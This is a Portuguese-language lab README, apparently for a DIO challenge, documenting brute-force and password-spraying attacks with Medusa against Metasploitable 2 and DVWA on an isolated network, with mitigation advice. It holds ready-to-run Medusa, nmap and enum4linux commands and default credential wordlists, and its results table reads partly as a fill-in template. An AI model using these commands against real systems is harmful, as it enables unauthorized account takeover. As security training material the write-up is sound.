# 🔐 Laboratório de Força Bruta com Kali Linux e Medusa

> Projeto prático desenvolvido para o desafio de código da **DIO** — Simulação de ataques de força bruta em ambiente controlado (Kali Linux + Metasploitable 2 + DVWA), com documentação de testes e recomendações de mitigação.

⚠️ **Aviso legal e ético:** Todos os testes aqui documentados foram realizados **exclusivamente em laboratório isolado** (rede host-only, sem acesso à internet ou a redes de produção), utilizando máquinas virtuais **intencionalmente vulneráveis** (Metasploitable 2 e DVWA), criadas justamente para fins educacionais de segurança ofensiva. **Nunca execute técnicas de força bruta contra sistemas, redes ou aplicações que não sejam de sua propriedade ou para os quais você não tenha autorização explícita por escrito.** O uso indevido dessas técnicas é crime (no Brasil, enquadrado pela Lei 12.737/2012 e pelo Marco Civil da Internet).

---

## 📑 Índice

- [Objetivo](#-objetivo)
- [Ambiente de Laboratório](#-ambiente-de-laboratório)
- [Topologia de Rede](#-topologia-de-rede)
- [Ferramentas Utilizadas](#-ferramentas-utilizadas)
- [Wordlists](#-wordlists)
- [Cenário 1 — Força Bruta em FTP](#-cenário-1--força-bruta-em-ftp)
- [Cenário 2 — Automação em Formulário Web (DVWA)](#-cenário-2--automação-em-formulário-web-dvwa)
- [Cenário 3 — Password Spraying em SMB](#-cenário-3--password-spraying-em-smb)
- [Resultados Consolidados](#-resultados-consolidados)
- [Recomendações de Mitigação](#-recomendações-de-mitigação)
- [Aprendizados](#-aprendizados)
- [Referências](#-referências)

---

## 🎯 Objetivo

Compreender, na prática, como funcionam ataques de força bruta e password spraying contra serviços comuns (FTP, aplicações web e SMB), utilizando o **Medusa** no **Kali Linux**, além de exercitar a leitura de resultados, a criação de wordlists e a proposição de medidas de defesa (mitigação) para cada vetor testado.

## 🖥️ Ambiente de Laboratório

| Máquina | Função | IP (rede interna) |
|---|---|---|
| Kali Linux | Máquina atacante | `192.168.56.10` |
| Metasploitable 2 | Alvo vulnerável (FTP, SMB) | `192.168.56.20` |
| DVWA (hospedado no Metasploitable 2 ou VM própria) | Alvo — aplicação web vulnerável | `192.168.56.20` |

**Configuração do VirtualBox:**
1. Criadas duas VMs: `Kali Linux` (atacante) e `Metasploitable 2` (alvo).
2. Placa de rede de ambas configurada em modo **Host-Only Adapter** (ex.: `vboxnet0`), garantindo que o tráfego fique isolado da rede física/host e da internet.
3. IPs fixos atribuídos manualmente para facilitar a reprodutibilidade dos testes.
4. Testada a comunicação entre as VMs com `ping` antes de iniciar os ataques.

```bash
# No Kali, teste de conectividade com o alvo
ping -c 4 192.168.56.20
```

> 📸 *Capturas de tela da configuração de rede disponíveis em [`/images`](./images).*

## 🗺️ Topologia de Rede

```
┌─────────────────────┐        Rede Host-Only        ┌──────────────────────┐
│     Kali Linux       │ <---------------------------> │   Metasploitable 2    │
│  192.168.56.10        │        (vboxnet0)             │   192.168.56.20        │
│  (Atacante)           │                                │  FTP / SMB / DVWA      │
└─────────────────────┘                                └──────────────────────┘
```

## 🛠️ Ferramentas Utilizadas

- **Kali Linux** — distribuição voltada a testes de segurança.
- **Medusa** — ferramenta de força bruta paralela para múltiplos serviços.
- **Nmap** — reconhecimento e descoberta de portas/serviços abertos.
- **Enum4linux / smbclient** — enumeração de usuários e compartilhamentos SMB.
- **Burp Suite (opcional)** — análise da requisição HTTP do formulário de login do DVWA.
- **DVWA** — aplicação web deliberadamente vulnerável.
- **Metasploitable 2** — VM com serviços propositalmente vulneráveis.

## 📋 Wordlists

Para manter o laboratório simples e didático, foram criadas wordlists pequenas e customizadas (ao invés de usar diretamente a `rockyou.txt` completa), simulando um cenário real de reconhecimento prévio (ex.: possíveis usuários identificados via engenharia social ou vazamentos).

Arquivos disponíveis em [`/wordlists`](./wordlists):

- `usuarios.txt` — lista de usuários comuns/testados.
- `senhas.txt` — lista de senhas fracas/comuns.

```text
# usuarios.txt
msfadmin
admin
root
user
ftp

# senhas.txt
msfadmin
admin
123456
password
toor
root
```

> 💡 Em um cenário real de pentest autorizado, essas listas seriam construídas a partir de OSINT, vazamentos conhecidos (ex.: *Have I Been Pwned*) e políticas de senha observadas na organização-alvo.

---

## 🔑 Cenário 1 — Força Bruta em FTP

### 1. Reconhecimento com Nmap

```bash
nmap -sV -p 21 192.168.56.20
```

Resultado esperado: porta 21 aberta, serviço `vsftpd 2.3.4` (versão propositalmente vulnerável do Metasploitable 2).

### 2. Ataque com Medusa

```bash
medusa -h 192.168.56.20 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp -t 3
```

**Parâmetros:**
- `-h` → host alvo
- `-U` → lista de usuários
- `-P` → lista de senhas
- `-M ftp` → módulo FTP
- `-t 3` → 3 threads paralelas (evitar sobrecarga/flood desnecessário)

### 3. Validação do acesso

Após o Medusa reportar uma credencial válida (ex.: `msfadmin:msfadmin`), validar manualmente:

```bash
ftp 192.168.56.20
# login: msfadmin / senha: msfadmin
```

> 📸 *Evidência do login bem-sucedido em [`/images/ftp-login.png`](./images).*

---

## 🌐 Cenário 2 — Automação em Formulário Web (DVWA)

### 1. Preparação do DVWA

- Nível de segurança do DVWA ajustado para **Low**, para fins didáticos.
- Login realizado manualmente uma vez para capturar os parâmetros do formulário (via Burp Suite ou inspeção do HTML) e o cookie de sessão (`PHPSESSID`) + token **anti-CSRF** (`user_token`), necessário em versões mais recentes do DVWA.

### 2. Ataque com Medusa (módulo web-form)

```bash
medusa -h 192.168.56.20 -U wordlists/usuarios.txt -P wordlists/senhas.txt \
  -M web-form \
  -m FORM:"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" \
  -T 5
```

**Parâmetros principais:**
- `-M web-form` → módulo de formulário web do Medusa
- `-m FORM:"..."` → define a URL, os campos do formulário (`^USER^` e `^PASS^` são substituídos pelas listas) e a *string* que identifica falha de login (`F=`)
- `-T 5` → número de hosts/paralelismo

> ⚠️ Observação importante: o DVWA moderno usa token CSRF dinâmico, o que impede ataques diretos de força bruta sem tratamento adicional (ex.: script em Python/Burp Intruder para capturar o token a cada requisição). Essa limitação foi documentada como parte do aprendizado — é, na prática, uma mitigação eficaz contra automação ingênua.

### 3. Validação

Login manual com a credencial encontrada para confirmar o acesso ao painel autenticado do DVWA.

> 📸 *Print do painel autenticado em [`/images/dvwa-login-success.png`](./images).*

---

## 🧑‍🤝‍🧑 Cenário 3 — Password Spraying em SMB com Enumeração de Usuários

### 1. Enumeração de usuários

```bash
enum4linux -U 192.168.56.20
```

ou

```bash
smbclient -L //192.168.56.20/ -N
```

Usuários identificados (ex.: `msfadmin`, `user`, `service`, `postgres`) foram adicionados à wordlist `usuarios.txt`.

### 2. Password Spraying com Medusa

Diferente da força bruta tradicional (muitas senhas por usuário), o *password spraying* testa **poucas senhas comuns contra muitos usuários**, reduzindo o risco de bloqueio de conta por tentativas excessivas:

```bash
medusa -h 192.168.56.20 -U wordlists/usuarios.txt -p "123456" -M smbnt -t 3
```

ou, testando uma pequena lista de senhas comuns contra todos os usuários:

```bash
medusa -h 192.168.56.20 -U wordlists/usuarios.txt -P wordlists/senhas_spray.txt -M smbnt -t 1
```

> 💡 O uso de `-t 1` (ou intervalos entre tentativas) simula o comportamento "lento e discreto" característico de ataques reais de spraying, que tentam evitar políticas de *lockout*.

### 3. Validação

```bash
smbclient //192.168.56.20/tmp -U msfadmin%msfadmin
```

> 📸 *Evidência de acesso ao compartilhamento SMB em [`/images/smb-access.png`](./images).*

---

## 📊 Resultados Consolidados

| Cenário | Serviço | Usuário | Senha | Status |
|---|---|---|---|---|
| 1 | FTP (vsftpd) | msfadmin | msfadmin | ✅ Acesso obtido |
| 2 | Web Login (DVWA) | admin | password | ✅ Acesso obtido (nível Low) |
| 3 | SMB | msfadmin | msfadmin | ✅ Acesso obtido |

*(Substitua pelos resultados reais obtidos no seu próprio laboratório.)*

---

## 🛡️ Recomendações de Mitigação

Para cada vetor testado, seguem contramedidas aplicáveis em ambientes reais:

### FTP
- Desabilitar contas e serviços FTP não utilizados; preferir SFTP/FTPS com autenticação forte.
- Implementar bloqueio de conta (*account lockout*) após N tentativas falhas.
- Utilizar `fail2ban` para banir IPs com múltiplas tentativas de login falhas.
- Trocar credenciais padrão/fracas imediatamente após a instalação.

### Aplicações Web (DVWA)
- Implementar **CAPTCHA** e/ou **rate limiting** por IP/usuário nos formulários de login.
- Utilizar **tokens anti-CSRF** dinâmicos (já presentes em versões recentes do DVWA) e invalidar tokens reutilizados.
- Adotar **MFA (autenticação multifator)**.
- Monitorar e alertar sobre picos de tentativas de login via WAF/SIEM.
- Políticas de senha forte e verificação contra listas de senhas vazadas.

### SMB
- Desabilitar protocolos legados (SMBv1) e exigir autenticação NTLMv2 ou Kerberos.
- Implementar políticas de *lockout* com cautela (evitando DoS proposital via lockout em massa).
- Segmentar a rede e restringir acesso SMB apenas a hosts/IPs autorizados (firewall).
- Monitorar tentativas de autenticação anômalas (múltiplos usuários, poucas senhas = padrão de spraying) via SIEM.

### Mitigações Gerais
- Autenticação multifator (MFA) em todos os serviços críticos.
- Monitoramento centralizado de logs (SIEM) com alertas para padrões de força bruta/spraying.
- Testes de intrusão periódicos e autorizados para validar as defesas implementadas.
- Conscientização dos usuários sobre uso de senhas fortes e únicas.

---

## 📚 Aprendizados

- Força bruta tradicional (muitas senhas, um usuário) e *password spraying* (poucas senhas, muitos usuários) exigem estratégias de defesa diferentes — a primeira é mitigada principalmente por *lockout*, a segunda exige monitoramento de padrões e MFA, já que respeita limites de tentativa por conta.
- Ferramentas como o Medusa são extremamente eficientes quando combinadas com reconhecimento prévio (Nmap, enum4linux) para reduzir o espaço de busca (usuários e serviços relevantes).
- Mecanismos simples como tokens CSRF dinâmicos já dificultam consideravelmente ataques automatizados ingênuos contra formulários web.
- Documentar cada etapa (comandos, evidências, resultados) é tão importante quanto executar o ataque — é o que torna o teste reprodutível e auditável.

---

## 📎 Referências

- [Kali Linux – Site Oficial](https://www.kali.org/)
- [DVWA – Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [Medusa – Documentação](https://github.com/jmk-foofus/medusa)
- [Nmap – Manual Oficial](https://nmap.org/book/man.html)
- [Metasploitable 2](https://docs.rapid7.com/metasploit/metasploitable-2/)

---

## 👤 Autor

Projeto desenvolvido como parte do desafio de código **"Simulando Ataques de Força Bruta com Kali Linux e Medusa"** da [DIO](https://www.dio.me/).
